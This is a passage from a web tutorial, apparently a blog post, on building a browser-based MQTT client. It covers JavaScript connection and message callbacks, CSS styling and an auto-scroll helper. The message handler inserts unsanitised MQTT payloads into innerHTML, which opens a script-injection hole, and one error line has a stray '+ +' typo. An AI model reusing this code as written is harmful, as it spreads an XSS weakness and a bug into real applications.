    client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;subscribe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;topic&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Called when the client loses its connection&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;onConnectionLost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;responseObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;ERROR: Connection lost&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;responseObject&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;errorCode &lt;span class=&quot;token operator&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;ERROR: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; responseObject&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;errorMessage &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Called when a message arrives&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;onMessageArrived&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;onMessageArrived: &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;payloadString&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;Topic: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;destinationName &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;  | &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;payloadString &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Called when the disconnection button is pressed&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;startDisconnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;disconnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;Disconnected&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We have finally got somewhere! With the addition of this JavaScript code we have a functioning web application that will connect to an MQTT broker, subscribe to an MQTT topic and print the received messages to the web page. An example of the web application receiving messages can be seen below:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./The%20web%20application%20receiving%20MQTT%20messages.png&quot; alt=&quot;receiving-mqtt-messages&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;styling-the-web-application&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#styling-the-web-application&quot; aria-label=&quot;styling the web application permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Styling the Web Application&lt;/h2&gt;
&lt;h4 id=&quot;css-styling-the-html-page&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#css-styling-the-html-page&quot; aria-label=&quot;css styling the html page permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CSS: Styling the HTML page&lt;/h4&gt;
&lt;p&gt;As it currently stands, our web application has a nice form and the required functionality to connect, subscribe and display MQTT messages to the end-user. However, we should probably add a little style to make the page look better and make the messages easier to view and review.&lt;/p&gt;
&lt;p&gt;The following CSS rules can be placed in the &lt;code class=&quot;language-text&quot;&gt;style.css&lt;/code&gt; file. These are just simple CSS rules that will add a little style and can be modified based on your requirements. The following rules specify the Open Sans font and set a &lt;code class=&quot;language-text&quot;&gt;wrapper&lt;/code&gt; div for the page to ensure it is centered and has a suitable width.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;css&quot;&gt;&lt;pre class=&quot;language-css&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;&lt;span class=&quot;token selector&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Open Sans&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; sans-serif&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token selector&quot;&gt;.wrapper&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;margin-left&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; auto&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;margin-right&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; auto&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 70%&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;padding-right&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 10px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;padding-left&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 10px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;css-styling-the-html-form&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#css-styling-the-html-form&quot; aria-label=&quot;css styling the html form permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CSS: Styling the HTML form&lt;/h4&gt;
&lt;p&gt;The HTML form has a terrible default layout without some CSS rules. Listed below are some basic rules to enhance the style of the form.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;css&quot;&gt;&lt;pre class=&quot;language-css&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;&lt;span class=&quot;token selector&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;width&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 150px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 0&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;-webkit-box-sizing&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; border-box&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;-moz-box-sizing&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; border-box&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;box-sizing&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; border-box&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token selector&quot;&gt;input[type=text]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 100%&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 12px 20px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 8px 0&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token selector&quot;&gt;input[type=button]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; gray&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; none&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; black&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 16px 32px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;text-decoration&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; none&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;font-weight&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; bold&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 4px 2px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; pointer&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token selector&quot;&gt;input[type=text]:focus&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; lightblue&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token selector&quot;&gt;input[type=button]:hover&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; #686868&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;css-styling-the-messages-div&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#css-styling-the-messages-div&quot; aria-label=&quot;css styling the messages div permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CSS: Styling the messages div&lt;/h4&gt;
&lt;p&gt;Finally, the most important part of the web page style is the &lt;em&gt;messages&lt;/em&gt; div. Without modification, it will print continuously to the bottom of the webpage and is difficult and messy to deal with the MQTT messages. These simple CSS rules will create a fixed sized block to display the messages, complete with a vertical scrollbar. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;css&quot;&gt;&lt;pre class=&quot;language-css&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;&lt;span class=&quot;token selector&quot;&gt;#messages&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;margin-top&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 12px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;margin-bottom&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 12px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 12px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;100%&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; inline-block&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;1px solid black&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;max-height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 250px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;min-height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 250px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; scroll&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token selector&quot;&gt;#messages span&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;overflow-y&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; scroll&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; scroll&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;js-writing-the-updatescroll-function&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#js-writing-the-updatescroll-function&quot; aria-label=&quot;js writing the updatescroll function permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;JS: Writing the &lt;code class=&quot;language-text&quot;&gt;updateScroll&lt;/code&gt; function&lt;/h4&gt;
&lt;p&gt;In the last section, we styled the &lt;em&gt;messages&lt;/em&gt; div and made it scrollable. One more nice feature would be if the messages box scrolled when it is full. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Updates #messages div to auto-scroll&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;updateScroll&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; element &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    element&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;scrollTop &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; element&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;scrollHeight&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Every time something is written to the &lt;em&gt;messages&lt;/em&gt; div, simply put include the &lt;code class=&quot;language-text&quot;&gt;updateScroll&lt;/code&gt; function after the append to the messages div. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token function&quot;&gt;updateScroll&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The final result is a nicely contained scrollable box for all the MQTT messages.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5bca9552f2d781ba3d74ca1abe7666af/1568e/messages-style.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 33.54430379746836%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA1UlEQVQoz5WR2QqEMAxF+/9f51IXrCuOglDXF5cH7yQB52VgHAMhTdOe3qTKGAOtNYIgkBhFEXyKcRyjrmuUZYm+77HvO9Z1xbZtX37tW2uhBOD7AmzaVgoHXT6OA09tGAao1KQE9ETd69XIK9b2UuQ1P8B2nudP/wCzLEMYhqRQQ5NK13HguC40qY6obW73unAHnKYJKs9zATIg4Kh9AfMouNbSGK7271TyWZUkCTzPE0CaZjCUs2qW/9SKooDiX6yqCsM4Yp5nkc1xWZaPc/6Pd12HN84uE6ih1NicAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;The web application receiving MQTT messages in a styled box&quot;
        title=&quot;The web application receiving MQTT messages in a styled box&quot;
        src=&quot;/static/5bca9552f2d781ba3d74ca1abe7666af/f058b/messages-style.png&quot;
        srcset=&quot;/static/5bca9552f2d781ba3d74ca1abe7666af/c26ae/messages-style.png 158w,
/static/5bca9552f2d781ba3d74ca1abe7666af/6bdcf/messages-style.png 315w,
/static/5bca9552f2d781ba3d74ca1abe7666af/f058b/messages-style.png 630w,
